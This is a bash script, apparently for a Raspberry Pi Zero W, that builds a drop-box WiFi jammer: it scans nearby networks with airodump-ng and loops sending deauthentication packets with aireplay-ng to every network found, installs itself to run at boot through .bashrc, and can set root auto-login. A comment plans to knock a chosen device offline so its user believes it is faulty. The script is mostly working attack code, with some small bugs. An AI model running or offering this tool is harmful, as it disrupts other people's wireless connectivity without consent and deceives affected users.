#!/bin/bash

#TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)
# aireplay-ng -0 $n -a $your_AP -c $mac $interface --ignore-negative-one

#TODO: Add a feature to target the closest WiFi in range. We'll play with PWR values in the scan file.

#this is your interface and since we use raspi0w, nexmon utilities use the same name for monitor mode
interface="wlan0"
#we use RAM to avoid flash memory wear out
working_folder="/dev/shm"

main()
{
  start_mon

  #check if script mode is chosen, otherwise prompt
  if [[ $1 == "--haki" ]]; then
    haki
  elif [[ $1 == "--closest" ]]; then
    #attack_closest
    echo "WIP"
    menu
  else
    menu
  fi
}

create_working_folder()
{
	if [ ! -d ""$working_folder"/perish_dump" ]
	then
		mkdir "$working_folder"/perish_dump
	fi
}

print_menu()
{
	clear
	echo
	echo " Startup Menu - Make modifications for startup"
	echo
	echo "   0    Uninstall any previous script"
	echo "   1    Enable auto-login"
	echo "   2    Disable auto-login"
	echo
	echo " Modes Menu - Install an attack mode at startup"
	echo
	echo "   3    Attack closest network only"
	echo "   4    Disrupt the perimeter"
	echo
	echo -n "	Choose an option : "
}

menu()
{
	#print the menu and choose your option afterwards
	print_menu

	read option
	clear
	case $option in

		0 )
			#remove startup entry
			sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
		;;

		1 )
			enable_autologin
			menu
			;;

		2 )
			disable_autologin
			menu
		;;

		3 )
			echo
			echo "		[!] Mode is work in progress. Not available."
			sleep 1
			menu

			#add start up entry if it doesn't exist
			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
				#include 5 seconds for safety, so you can ssh
				echo "sleep 10; ./rasperish/rasperi.sh --closest" >> ~/.bashrc
			fi
			echo "	[i] Closest mode enabled, will be available after reboot."
			echo "	[!] Note that you have 10 seconds delay before the attacking after reboot,"
			echo "      so that you can connect and stop your pi."
			sleep 4
			;;

		4 )
			#add start up entry if it doesn't exist
			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
				#include 5 seconds for safety, so you can ssh
				echo "sleep 10; ./rasperish/rasperi.sh --haki" >> ~/.bashrc
			fi
			echo "	[i] Haki mode enabled, will be available after reboot."
			echo "	[!] Note that you have 10 seconds delay before the attacking after reboot,"
			echo "      so that you can connect and stop your pi."
			sleep 4
			;;


		* )
			echo
			echo "		[!] Invalid option, try again"
			sleep 1
			menu
			;;
	esac
}

enable_autologin()
{
	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -a root --noclear %I \$TERM" /lib/systemd/system/getty@.service
	echo "	[i] Enabled auto-login"
	sleep 1
}

disable_autologin()
{
	sed -i "/ExecStart/c\ExecStart=-/sbin/agetty -o '-p -- \\u' --noclear %I \$TERM" /lib/systemd/system/getty@.service
	echo "	[i] Enabled auto-login"
	sleep 1
}

haki()
{
	clear

	#create the working directory, where we save our scan files temporarily
	create_working_folder

	echo "	[i] Scanning continuously for networks... "
	echo

	#scan every n seconds
	scan 5

	while true
	do
		local i=1
		while read essid
		do
			#get each corresponding channel for every essid found
			channel=$(sed -n "${i}{p;q;}" $(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2))

			echo "	[+] Synchronising card to channel: $channel"
			#sync the card to the victim's channel
			iwconfig $interface channel $channel

			echo "	[+] Attacking $essid"
			#send some deauth packets to each wifi network
			aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1

			((i++))
		done < $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
	done #loop when you are done
}

stop_mon()
{
	nexutil -m0
}

start_mon()
{
	#m2 is the correct mode, however it seems that there is a bug and in m2 mode sometimes nothing can be scanned
	#doing this, solves that case
	iw dev $interface set power_save off
	nexutil -m2
}

scan()
{
	scan_interval=$1

	#start data dumping in the background every n seconds
	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval &

	#add an initial hysteresis before starting in order to have data ready
	sleep $scan_interval
}

#Here starts the script and passes the flag argument to it
main $1
